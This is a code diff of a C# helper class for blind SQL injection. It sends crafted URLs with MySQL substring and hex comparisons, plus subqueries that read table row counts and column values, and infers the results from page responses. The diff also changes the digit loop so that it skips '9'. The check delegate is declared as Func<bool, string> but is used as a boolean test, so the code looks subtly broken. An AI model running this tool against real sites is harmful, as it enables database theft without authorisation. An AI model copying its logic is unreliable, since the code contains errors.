@@ -26,7 +26,7 @@ public class Test
 		return result ?? "";
 	}
 	
-	public static async Task<int> get_int(string url, string query_format, string target_query, Func<bool, string> check_func) {
+	public static async Task<int> get_int_10(string url, string query_format, string target_query, Func<bool, string> check_func) {
 		string result_s = "";
 		int index = 1;
 		while(true){
@@ -35,7 +35,7 @@ public class Test
 			string html = await _get_html(test_url);
 			if(check_func(html)) break;
 			//現在の桁の数字を取得
-			for(int i = 0x30; i < 0x40; i++){
+			for(int i = 0x30; i < 0x39; i++){
 				test_url = CraftURL(url, query_format, $"mid(cast({target_query} as char),{index},1)=0x" + i.ToString("X2"));
 				html = await _get_html(test_url);
 				if(check_func(html)){
@@ -58,7 +58,7 @@ public class Test
 	//GET, Boolean
 	//row >= 0
 	public static async Task<string> get_string(string url, string query_format, string table, string column, int row, Func<bool, string> check_func, Encoding encoding = Encoding.UTF8, bool row_check = false){
-		if(row_check && await get_int(url, query_format, $"(select count(*) from {table})", check_func) <= row)
+		if(row_check && await get_int_10(url, query_format, $"(select count(*) from {table})", check_func) <= row)
 			return null;
 		var query = $"(select {column} from {table} limit {row},1)";
 		var result = new List<byte>();
